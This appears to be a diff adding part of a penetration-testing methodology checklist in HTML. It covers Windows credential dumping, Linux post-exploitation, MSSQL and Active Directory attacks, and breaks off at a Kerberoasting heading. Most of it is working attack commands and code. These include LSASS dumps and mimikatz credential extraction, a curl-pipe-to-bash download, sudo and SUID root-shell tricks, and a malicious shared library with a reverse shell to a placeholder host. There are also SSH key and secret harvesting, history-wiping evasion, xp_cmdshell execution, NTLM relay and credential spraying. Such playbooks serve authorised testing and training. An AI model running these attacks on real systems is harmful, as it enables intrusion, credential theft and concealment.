+# Dump using rundll32 (requires SeDebugPrivilege)
+rundll32 C:\Windows\System32\comsvcs.dll, MiniDump [lsass-pid] C:\Windows\Temp\out.dmp full
+
+# Process dump offline
+pypykatz lsa minidump out.dmp
+
+# Mimikatz — classic credential extraction
+mimikatz # privilege::debug
+mimikatz # sekurlsa::logonpasswords
+mimikatz # sekurlsa::wdigest
+mimikatz # lsadump::sam</code></pre>
+<pre><code class="language-powershell"># DPAPI — decrypt user credential stores
+# List Credential Manager vaults
+cmdkey /list
+vaultcmd /listcreds:"Windows Credentials" /all
+
+# Extract DPAPI master keys (mimikatz)
+mimikatz # dpapi::masterkey /in:C:\Users\[user]\AppData\Roaming\Microsoft\Protect\[SID]\[guid] /rpc
+mimikatz # dpapi::cred /in:C:\Users\[user]\AppData\Local\Microsoft\Credentials\[guid]
+
+# SharpDPAPI — automated extraction
+SharpDPAPI.exe triage
+SharpDPAPI.exe machinetriage</code></pre>
+<p><strong>References:</strong> <a href="https://attack.mitre.org/techniques/T1003/" target="_blank" rel="noopener noreferrer">MITRE T1003 OS Cred Dump</a> &middot; <a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation" target="_blank" rel="noopener noreferrer">HackTricks Win Local</a></p>
+
+<p><strong>General references:</strong> <a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation" target="_blank" rel="noopener noreferrer">HackTricks Win Local</a> &middot; <a href="https://lolbas-project.github.io/" target="_blank" rel="noopener noreferrer">LOLBAS</a></p>
+
+<h3 id="methodology-linux-postex">11.6 Linux Post Exploitation</h3>
+<p>Triage &rarr; look for misconfigs first &rarr; escalate &rarr; pivot. Save kernel exploits for last.</p>
+<h4 id="methodology-linux-postex-triage">11.6.1 Host Triage</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-linux-postex-triage-wf-0"> Identity and privilege:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-linux-postex-triage-wf-0-0"> <code>id</code>, <code>groups</code>, <code>sudo -l</code></li>
+        <li><input type="checkbox" data-id="methodology-linux-postex-triage-wf-0-1"> <code>cat /etc/passwd</code>, <code>cat /etc/shadow</code> (if readable)</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-linux-postex-triage-wf-1"> Host facts:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-linux-postex-triage-wf-1-0"> <code>uname -a</code>, <code>cat /etc/os-release</code></li>
+        <li><input type="checkbox" data-id="methodology-linux-postex-triage-wf-1-1"> <code>hostname -f</code>, <code>dnsdomainname</code></li>
+        <li><input type="checkbox" data-id="methodology-linux-postex-triage-wf-1-2"> <code>ps auxf</code>, <code>ss -tulpn</code></li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-linux-postex-triage-wf-2"> Run an automated checker:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-linux-postex-triage-wf-2-0"> LinPEAS: <code>./linpeas.sh -a</code></li>
+        <li><input type="checkbox" data-id="methodology-linux-postex-triage-wf-2-1"> LinEnum, linux-smart-enumeration</li>
+      </ul>
+    </li>
+  </ul>
+<pre><code class="language-bash"># Quick manual enumeration one-liner block
+id &amp;&amp; whoami &amp;&amp; hostname -f
+uname -a &amp;&amp; cat /etc/os-release
+ip a &amp;&amp; ip route &amp;&amp; ss -tulpn
+ps auxf | head -40
+cat /etc/crontab &amp;&amp; ls -la /etc/cron*
+find / -perm -u=s -type f 2&gt;/dev/null
+getcap -r / 2&gt;/dev/null
+cat /etc/passwd | grep -v nologin | grep -v false
+ls -la /home/ &amp;&amp; ls -laR /home/*/.ssh/ 2&gt;/dev/null
+env &amp;&amp; cat /etc/environment 2&gt;/dev/null
+
+# Download and run LinPEAS
+curl -L http://[ip]/linpeas.sh | bash
+# Or transfer via base64
+base64 -w0 linpeas.sh | xclip -sel c   # on attacker
+echo "[paste]" | base64 -d | bash       # on target</code></pre>
+
+<h4 id="methodology-linux-postex-privesc">11.6.2 Privilege Escalation</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-linux-postex-privesc-wf-0"> Look at sudo first:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-linux-postex-privesc-wf-0-0"> <code>sudo -l</code> &mdash; cross-reference each entry with <a href="https://gtfobins.github.io/" target="_blank" rel="noopener noreferrer">GTFOBins</a></li>
+        <li><input type="checkbox" data-id="methodology-linux-postex-privesc-wf-0-1"> Look for env-var preservation (<code>env_keep</code>) abuses</li>
+        <li><input type="checkbox" data-id="methodology-linux-postex-privesc-wf-0-2"> Look for wildcards in sudo command paths</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-linux-postex-privesc-wf-1"> Look at SUID binaries:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-linux-postex-privesc-wf-1-0"> <code>find / -perm -u=s -type f 2>/dev/null</code></li>
+        <li><input type="checkbox" data-id="methodology-linux-postex-privesc-wf-1-1"> Cross-reference each binary with GTFOBins</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-linux-postex-privesc-wf-2"> Look at capabilities:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-linux-postex-privesc-wf-2-0"> <code>getcap -r / 2>/dev/null</code></li>
+        <li><input type="checkbox" data-id="methodology-linux-postex-privesc-wf-2-1"> cap_setuid / cap_dac_read_search lead to easy wins</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-linux-postex-privesc-wf-3"> Look at writable PATH dirs &amp; cron:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-linux-postex-privesc-wf-3-0"> <code>ls -la /etc/cron* /var/spool/cron</code></li>
+        <li><input type="checkbox" data-id="methodology-linux-postex-privesc-wf-3-1"> <code>cat /etc/crontab</code> and per-user crontabs</li>
+        <li><input type="checkbox" data-id="methodology-linux-postex-privesc-wf-3-2"> Audit the PATH for writable elements</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-linux-postex-privesc-wf-4"> Kernel CVE as a last resort:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-linux-postex-privesc-wf-4-0"> Cross-reference kernel + distro with public PoCs</li>
+        <li><input type="checkbox" data-id="methodology-linux-postex-privesc-wf-4-1"> Test on a snapshot before running on the target</li>
+      </ul>
+    </li>
+  </ul>
+<pre><code class="language-bash"># Sudo abuse examples (cross-reference GTFOBins)
+# If sudo -l shows: (root) NOPASSWD: /usr/bin/find
+sudo find / -exec /bin/bash \; -quit
+
+# If sudo -l shows: (root) NOPASSWD: /usr/bin/vim
+sudo vim -c ':!/bin/bash'
+
+# If sudo -l shows: (root) NOPASSWD: /usr/bin/python3
+sudo python3 -c 'import os; os.system("/bin/bash")'
+
+# If sudo -l shows env_keep+=LD_PRELOAD
+# Compile: gcc -shared -fPIC -o /tmp/pe.so pe.c -nostartfiles
+# pe.c: void _init() { setuid(0); system("/bin/bash -p"); }
+sudo LD_PRELOAD=/tmp/pe.so /usr/bin/[allowed-binary]</code></pre>
+<pre><code class="language-bash"># SUID exploitation
+find / -perm -u=s -type f 2&gt;/dev/null
+
+# Custom SUID binary with shared-lib hijack
+# 1. Find SUID binary that loads a missing .so
+strace /usr/local/bin/suid-binary 2&gt;&amp;1 | grep "No such file"
+# 2. Write malicious .so
+cat &lt;&lt;'PAYLOAD' &gt; /tmp/evil.c
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+static void hijack() __attribute__((constructor));
+void hijack() { setuid(0); system("/bin/bash -p"); }
+PAYLOAD
+gcc -shared -fPIC -o /tmp/evil.so /tmp/evil.c
+# 3. Place in the search path and trigger</code></pre>
+<p><strong>References:</strong> <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation" target="_blank" rel="noopener noreferrer">HackTricks Linux PrivEsc</a> &middot; <a href="https://gtfobins.github.io/" target="_blank" rel="noopener noreferrer">GTFOBins</a></p>
+
+<h4 id="methodology-linux-postex-lateral">11.6.3 Lateral Movement</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-linux-postex-lateral-wf-0"> Re-use SSH keys:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-linux-postex-lateral-wf-0-0"> Look for <code>~/.ssh/id_*</code> on every accessible user</li>
+        <li><input type="checkbox" data-id="methodology-linux-postex-lateral-wf-0-1"> Look in <code>/etc/ssh/ssh_host_*_key</code> when root</li>
+        <li><input type="checkbox" data-id="methodology-linux-postex-lateral-wf-0-2"> Check known_hosts for next-target hostnames</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-linux-postex-lateral-wf-1"> Re-use Docker / Kubernetes / cloud creds:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-linux-postex-lateral-wf-1-0"> <code>~/.docker/config.json</code></li>
+        <li><input type="checkbox" data-id="methodology-linux-postex-lateral-wf-1-1"> <code>~/.kube/config</code></li>
+        <li><input type="checkbox" data-id="methodology-linux-postex-lateral-wf-1-2"> <code>~/.aws/credentials</code></li>
+      </ul>
+    </li>
+  </ul>
+<pre><code class="language-bash"># SSH key reuse for lateral movement
+# Collect all private keys
+find / -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" 2&gt;/dev/null
+# Check known_hosts for targets
+cat ~/.ssh/known_hosts | awk '{print $1}' | sort -u
+
+# Pivot via SSH with key
+ssh -i /home/user/.ssh/id_rsa user@[next-target] -o StrictHostKeyChecking=no
+
+# SSH dynamic port forward for proxychains
+ssh -D 1080 -N -f user@[pivot-host]
+# Then: proxychains4 nmap -sT -Pn [internal-target]
+
+# Harvest credentials from config files
+grep -rli "password\|passwd\|secret\|key\|token" /opt/ /var/ /etc/ /home/ 2&gt;/dev/null
+cat /var/www/html/wp-config.php 2&gt;/dev/null | grep DB_
+cat /etc/shadow   # if readable — crack with hashcat -m 1800</code></pre>
+
+<h4 id="methodology-linux-postex-shared-lib">11.6.4 Shared Library Hijacking</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-linux-postex-shared-lib-wf-0"> Identify writable directories in the linker&rsquo;s search path:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-linux-postex-shared-lib-wf-0-0"> Read <code>/etc/ld.so.conf</code> and <code>/etc/ld.so.conf.d/*</code></li>
+        <li><input type="checkbox" data-id="methodology-linux-postex-shared-lib-wf-0-1"> Validate with <code>ldconfig -v</code></li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-linux-postex-shared-lib-wf-1"> Drop a malicious .so that a SUID binary will load:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-linux-postex-shared-lib-wf-1-0"> Compile: <code>gcc -shared -fPIC -o evil.so evil.c</code></li>
+        <li><input type="checkbox" data-id="methodology-linux-postex-shared-lib-wf-1-1"> Trigger by running the consuming binary</li>
+      </ul>
+    </li>
+  </ul>
+<pre><code class="language-c">// Malicious shared library — reverse shell on load
+// Compile: gcc -shared -fPIC -o evil.so evil.c -nostartfiles
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+
+static void hijack() __attribute__((constructor));
+
+void hijack() {
+    setuid(0);
+    setgid(0);
+    system("/bin/bash -p");
+    // Or: system("bash -i &gt;&amp; /dev/tcp/[ip]/[port] 0&gt;&amp;1");
+}</code></pre>
+<pre><code class="language-bash"># Find shared library hijack opportunities
+# Check LD_LIBRARY_PATH and ld.so.conf for writable dirs
+cat /etc/ld.so.conf /etc/ld.so.conf.d/* 2&gt;/dev/null
+ldconfig -v 2&gt;/dev/null | grep -v "^	"
+
+# Find SUID binaries and check their library dependencies
+find / -perm -u=s -type f 2&gt;/dev/null | while read bin; do
+    echo "=== $bin ==="
+    ldd "$bin" 2&gt;/dev/null | grep "not found"
+done
+
+# LD_PRELOAD hijack (if env is preserved via sudo)
+gcc -shared -fPIC -o /tmp/pe.so pe.c -nostartfiles
+sudo LD_PRELOAD=/tmp/pe.so [allowed-command]</code></pre>
+
+<h4 id="methodology-linux-postex-defense-evasion">11.6.5 Defense Evasion</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-linux-postex-defense-evasion-wf-0"> Avoid bash history:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-linux-postex-defense-evasion-wf-0-0"> <code>unset HISTFILE</code></li>
+        <li><input type="checkbox" data-id="methodology-linux-postex-defense-evasion-wf-0-1"> <code>export HISTFILE=/dev/null</code></li>
+        <li><input type="checkbox" data-id="methodology-linux-postex-defense-evasion-wf-0-2"> <code>history -c</code> on exit</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-linux-postex-defense-evasion-wf-1"> Clean up after privesc:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-linux-postex-defense-evasion-wf-1-0"> Remove dropped binaries</li>
+        <li><input type="checkbox" data-id="methodology-linux-postex-defense-evasion-wf-1-1"> Restore modified configs</li>
+        <li><input type="checkbox" data-id="methodology-linux-postex-defense-evasion-wf-1-2"> Document what changed in handoff notes</li>
+      </ul>
+    </li>
+  </ul>
+
+<p><strong>General references:</strong> <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation" target="_blank" rel="noopener noreferrer">HackTricks Linux PrivEsc</a> &middot; <a href="https://gtfobins.github.io/" target="_blank" rel="noopener noreferrer">GTFOBins</a></p>
+
+<h3 id="methodology-mssql">11.7 MSSQL</h3>
+<p>Authenticate, enumerate, then weaponise. Always look for relay and linked-server pivots before noisy primitives.</p>
+<h4 id="methodology-mssql-auth">11.7.1 Authentication</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-mssql-auth-wf-0"> Pick a credential source:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-mssql-auth-wf-0-0"> Domain user with default grants</li>
+        <li><input type="checkbox" data-id="methodology-mssql-auth-wf-0-1"> <code>sa</code> with weak password</li>
+        <li><input type="checkbox" data-id="methodology-mssql-auth-wf-0-2"> NTLM relay from a captured hash</li>
+        <li><input type="checkbox" data-id="methodology-mssql-auth-wf-0-3"> Hash from a config file or memory dump</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-mssql-auth-wf-1"> Validate via netexec:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-mssql-auth-wf-1-0"> <code>netexec mssql [ip] -u user -p pass</code></li>
+        <li><input type="checkbox" data-id="methodology-mssql-auth-wf-1-1"> <code>netexec mssql [ip] -u user -H ntlm-hash</code></li>
+        <li><input type="checkbox" data-id="methodology-mssql-auth-wf-1-2"> <code>netexec mssql [ip] --local-auth -u sa -p pass</code></li>
+      </ul>
+    </li>
+  </ul>
+
+<h4 id="methodology-mssql-enumeration">11.7.2 Enumeration</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-mssql-enumeration-wf-0"> Server-level info:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-mssql-enumeration-wf-0-0"> <code>SELECT @@VERSION</code></li>
+        <li><input type="checkbox" data-id="methodology-mssql-enumeration-wf-0-1"> <code>SELECT name FROM sys.databases</code></li>
+        <li><input type="checkbox" data-id="methodology-mssql-enumeration-wf-0-2"> <code>SELECT system_user, IS_SRVROLEMEMBER('sysadmin')</code></li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-mssql-enumeration-wf-1"> Role and login map:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-mssql-enumeration-wf-1-0"> <code>EXEC sp_helpsrvrolemember 'sysadmin'</code></li>
+        <li><input type="checkbox" data-id="methodology-mssql-enumeration-wf-1-1"> <code>SELECT loginname FROM master..syslogins WHERE sysadmin = 1</code></li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-mssql-enumeration-wf-2"> Linked servers and impersonation:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-mssql-enumeration-wf-2-0"> <code>SELECT * FROM sys.servers</code></li>
+        <li><input type="checkbox" data-id="methodology-mssql-enumeration-wf-2-1"> <code>EXEC sp_helplinkedsrvlogin</code></li>
+        <li><input type="checkbox" data-id="methodology-mssql-enumeration-wf-2-2"> <code>SELECT b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'</code></li>
+      </ul>
+    </li>
+  </ul>
+
+<h4 id="methodology-mssql-code-exec">11.7.3 Code Execution Primitives</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-mssql-code-exec-wf-0"> xp_cmdshell route:</li>
+  </ul>
+<pre><code class="language-bash"># Enable xp_cmdshell (requires sysadmin)
+EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+
+# Execute commands
+EXEC xp_cmdshell 'whoami'
+EXEC xp_cmdshell 'powershell -enc [base64-payload]'</code></pre>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-mssql-code-exec-wf-1"> OLE Automation route:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-mssql-code-exec-wf-1-0"> <code>EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;</code></li>
+        <li><input type="checkbox" data-id="methodology-mssql-code-exec-wf-1-1"> <code>DECLARE @o INT EXEC sp_OACreate 'WScript.Shell', @o OUT EXEC sp_OAMethod @o, 'Run', NULL, 'cmd /c calc'</code></li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-mssql-code-exec-wf-2"> CLR assembly route:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-mssql-code-exec-wf-2-0"> <code>EXEC sp_configure 'clr enabled', 1; RECONFIGURE;</code></li>
+        <li><input type="checkbox" data-id="methodology-mssql-code-exec-wf-2-1"> <code>EXEC sp_configure 'clr strict security', 0;</code></li>
+        <li><input type="checkbox" data-id="methodology-mssql-code-exec-wf-2-2"> Load a signed assembly with <code>CREATE ASSEMBLY</code> and execute</li>
+      </ul>
+    </li>
+  </ul>
+
+<h4 id="methodology-mssql-linked-server">11.7.4 Linked Server Pivot</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-mssql-linked-server-wf-0"> Enumerate linked servers and reachable databases:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-mssql-linked-server-wf-0-0"> <code>SELECT * FROM sys.servers</code></li>
+        <li><input type="checkbox" data-id="methodology-mssql-linked-server-wf-0-1"> <code>SELECT * FROM OPENQUERY([linked], 'SELECT @@version')</code></li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-mssql-linked-server-wf-1"> Pivot RPC for xp_cmdshell on the linked side:</li>
+  </ul>
+<pre><code class="language-bash"># Enable xp_cmdshell on linked server
+EXEC ('sp_configure ''show advanced options'', 1; reconfigure') AT [linked]
+EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure') AT [linked]
+
+# Execute on linked server
+EXEC ('xp_cmdshell ''whoami''') AT [linked]</code></pre>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-mssql-linked-server-wf-2"> Chain across multiple links if needed</li>
+  </ul>
+
+<h4 id="methodology-mssql-relay">11.7.5 NTLM Relay Attacks</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-mssql-relay-wf-0"> Set up the relay listener:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-mssql-relay-wf-0-0"> <code>ntlmrelayx.py -t mssql://[mssql-ip] -smb2support -socks</code></li>
+        <li><input type="checkbox" data-id="methodology-mssql-relay-wf-0-1"> Validate the relay target accepts NTLM (no SMB signing)</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-mssql-relay-wf-1"> Coerce NTLM to your listener:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-mssql-relay-wf-1-0"> Coercer / PetitPotam / PrinterBug</li>
+        <li><input type="checkbox" data-id="methodology-mssql-relay-wf-1-1"> Webserver coercion via <code>img src=\\\\you\\share</code></li>
+      </ul>
+    </li>
+  </ul>
+
+<h4 id="methodology-mssql-privesc">11.7.6 Privilege Escalation</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-mssql-privesc-wf-0"> Impersonate sysadmin via <code>EXECUTE AS</code></li>
+    <li><input type="checkbox" data-id="methodology-mssql-privesc-wf-1"> Trustworthy database escalation:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-mssql-privesc-wf-1-0"> <code>ALTER DATABASE [db] SET TRUSTWORTHY ON</code> when authorised</li>
+        <li><input type="checkbox" data-id="methodology-mssql-privesc-wf-1-1"> Then use OWNER-mapped login to escalate</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-mssql-privesc-wf-2"> UNC path coercion via xp_dirtree:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-mssql-privesc-wf-2-0"> <code>EXEC xp_dirtree '\\\\[you]\\share\\'</code> &mdash; captures NTLMv2 from the SQL service account</li>
+      </ul>
+    </li>
+  </ul>
+
+<p><strong>General references:</strong> <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server" target="_blank" rel="noopener noreferrer">HackTricks MSSQL</a></p>
+
+<h3 id="methodology-ad-enumeration">11.8 Active Directory Enumeration</h3>
+<p>Collect a full view of the domain before touching anything. Plan attack paths before staging.</p>
+<h4 id="methodology-ad-enumeration-bloodhound">11.8.1 BloodHound &amp; SharpHound</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-ad-enumeration-bloodhound-wf-0"> Collect from the foothold with the right scope:</li>
+  </ul>
+<pre><code class="language-bash"># Windows: in-memory via execute-assembly or direct
+SharpHound.exe -c All --zipfilename loot.zip
+# Quieter: DC-only collection
+SharpHound.exe -c DCOnly --stealth
+
+# Linux foothold
+bloodhound-python -u [user] -p [pass] -d [domain] -dc [dc] -c All</code></pre>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-ad-enumeration-bloodhound-wf-1"> Import and run the foundation queries:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-ad-enumeration-bloodhound-wf-1-0"> Shortest path from owned principals to Domain Admins</li>
+        <li><input type="checkbox" data-id="methodology-ad-enumeration-bloodhound-wf-1-1"> Kerberoastable users + members of high-value groups</li>
+        <li><input type="checkbox" data-id="methodology-ad-enumeration-bloodhound-wf-1-2"> Constrained/unconstrained delegation map</li>
+        <li><input type="checkbox" data-id="methodology-ad-enumeration-bloodhound-wf-1-3"> ACL chains into Tier-0</li>
+      </ul>
+    </li>
+  </ul>
+<p><strong>References:</strong> <a href="https://posts.specterops.io/" target="_blank" rel="noopener noreferrer">SpecterOps blog</a></p>
+
+<h4 id="methodology-ad-enumeration-ldap">11.8.2 Direct LDAP Queries</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-ad-enumeration-ldap-wf-0"> Quick enumeration via netexec:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-ad-enumeration-ldap-wf-0-0"> <code>netexec ldap [dc] -u user -p pass --users</code></li>
+        <li><input type="checkbox" data-id="methodology-ad-enumeration-ldap-wf-0-1"> <code>netexec ldap [dc] -u user -p pass --groups</code></li>
+        <li><input type="checkbox" data-id="methodology-ad-enumeration-ldap-wf-0-2"> <code>netexec ldap [dc] -u user -p pass --trusted-for-delegation</code></li>
+        <li><input type="checkbox" data-id="methodology-ad-enumeration-ldap-wf-0-3"> <code>netexec ldap [dc] -u user -p pass --asreproast asrep.out</code></li>
+        <li><input type="checkbox" data-id="methodology-ad-enumeration-ldap-wf-0-4"> <code>netexec ldap [dc] -u user -p pass --kerberoasting tgs.out</code></li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-ad-enumeration-ldap-wf-1"> Targeted LDAP filters via ldapsearch / ldeep:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-ad-enumeration-ldap-wf-1-0"> Disabled users vs active users</li>
+        <li><input type="checkbox" data-id="methodology-ad-enumeration-ldap-wf-1-1"> Service accounts with SPNs</li>
+        <li><input type="checkbox" data-id="methodology-ad-enumeration-ldap-wf-1-2"> Computers with TRUSTED_FOR_DELEGATION</li>
+        <li><input type="checkbox" data-id="methodology-ad-enumeration-ldap-wf-1-3"> Pre-auth-not-required accounts</li>
+      </ul>
+    </li>
+  </ul>
+
+<h4 id="methodology-ad-enumeration-powerview">11.8.3 PowerView</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-ad-enumeration-powerview-wf-0"> Domain map:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-ad-enumeration-powerview-wf-0-0"> <code>Get-DomainController</code></li>
+        <li><input type="checkbox" data-id="methodology-ad-enumeration-powerview-wf-0-1"> <code>Get-DomainTrust -SearchBase "DC=parent,DC=tld"</code></li>
+        <li><input type="checkbox" data-id="methodology-ad-enumeration-powerview-wf-0-2"> <code>Get-DomainOU</code></li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-ad-enumeration-powerview-wf-1"> Identity map:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-ad-enumeration-powerview-wf-1-0"> <code>Get-DomainUser -SPN | select samaccountname</code></li>
+        <li><input type="checkbox" data-id="methodology-ad-enumeration-powerview-wf-1-1"> <code>Get-DomainUser -PreauthNotRequired</code></li>
+        <li><input type="checkbox" data-id="methodology-ad-enumeration-powerview-wf-1-2"> <code>Get-DomainGroupMember "Domain Admins" -Recurse</code></li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-ad-enumeration-powerview-wf-2"> Delegation map:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-ad-enumeration-powerview-wf-2-0"> <code>Get-DomainComputer -Unconstrained</code></li>
+        <li><input type="checkbox" data-id="methodology-ad-enumeration-powerview-wf-2-1"> <code>Get-DomainUser -TrustedToAuth | select samaccountname, msds-allowedtodelegateto</code></li>
+        <li><input type="checkbox" data-id="methodology-ad-enumeration-powerview-wf-2-2"> <code>Get-DomainComputer | ?{$_."msds-allowedtoactonbehalfofotheridentity"}</code></li>
+      </ul>
+    </li>
+  </ul>
+
+<h4 id="methodology-ad-enumeration-acl-enum">11.8.4 ACL Enumeration</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-ad-enumeration-acl-enum-wf-0"> Generic-All / Generic-Write / WriteDACL / WriteOwner:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-ad-enumeration-acl-enum-wf-0-0"> BloodHound built-in queries cover the common chains</li>
+        <li><input type="checkbox" data-id="methodology-ad-enumeration-acl-enum-wf-0-1"> PowerView: <code>Get-DomainObjectAcl -Identity [target] -ResolveGUIDs</code></li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-ad-enumeration-acl-enum-wf-1"> AddSelf / AddMember chains:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-ad-enumeration-acl-enum-wf-1-0"> Path through nested groups into Tier-0</li>
+        <li><input type="checkbox" data-id="methodology-ad-enumeration-acl-enum-wf-1-1"> AddMember-then-DCSync chain into Domain Admins</li>
+      </ul>
+    </li>
+  </ul>
+
+<h4 id="methodology-ad-enumeration-netexec">11.8.5 NetExec / CrackMapExec Sweeps</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-ad-enumeration-netexec-wf-0"> Spray validated credentials across the domain:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-ad-enumeration-netexec-wf-0-0"> <code>netexec smb [subnet]/[mask] -u user -p pass --shares</code></li>
+        <li><input type="checkbox" data-id="methodology-ad-enumeration-netexec-wf-0-1"> <code>netexec smb [subnet]/[mask] -u user -p pass --loggedon-users</code></li>
+        <li><input type="checkbox" data-id="methodology-ad-enumeration-netexec-wf-0-2"> <code>netexec smb [subnet]/[mask] -u user -p pass -M spider_plus</code></li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-ad-enumeration-netexec-wf-1"> Find admin where the user is local-admin:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-ad-enumeration-netexec-wf-1-0"> <code>netexec smb [subnet]/[mask] -u user -p pass</code> &mdash; <code>Pwn3d!</code> marker</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-ad-enumeration-netexec-wf-2"> Pivot to WinRM / MSSQL with the same cred:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-ad-enumeration-netexec-wf-2-0"> <code>netexec winrm [ip] -u user -p pass</code></li>
+        <li><input type="checkbox" data-id="methodology-ad-enumeration-netexec-wf-2-1"> <code>netexec mssql [ip] -u user -p pass</code></li>
+      </ul>
+    </li>
+  </ul>
+
+<h4 id="methodology-ad-enumeration-bloodhound-cypher">11.8.6 Cypher Queries</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-ad-enumeration-bloodhound-cypher-wf-0"> Useful saved queries:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-ad-enumeration-bloodhound-cypher-wf-0-0"> Shortest path to Domain Admins</li>
+        <li><input type="checkbox" data-id="methodology-ad-enumeration-bloodhound-cypher-wf-0-1"> Shortest path to Tier-0 from owned principals</li>
+        <li><input type="checkbox" data-id="methodology-ad-enumeration-bloodhound-cypher-wf-0-2"> Users with paths through ACLs only</li>
+        <li><input type="checkbox" data-id="methodology-ad-enumeration-bloodhound-cypher-wf-0-3"> Computers with unconstrained delegation reachable by a non-DA</li>
+      </ul>
+    </li>
+  </ul>
+
+<p><strong>General references:</strong> <a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology" target="_blank" rel="noopener noreferrer">HackTricks AD</a> &middot; <a href="https://posts.specterops.io/" target="_blank" rel="noopener noreferrer">SpecterOps blog</a> &middot; <a href="https://adsecurity.org/" target="_blank" rel="noopener noreferrer">AD Security</a></p>
+
+<h3 id="methodology-ad-exploitation">11.9 Active Directory Exploitation</h3>
+<p>Pick the right primitive for the captured context. Stage credentials, tickets, certificates safely; validate dominance is reproducible.</p>
+<h4 id="methodology-ad-exploitation-kerberoast-asrep">11.9.1 Kerberoasting &amp; AS-REP Roasting</h4>
+  <ul>
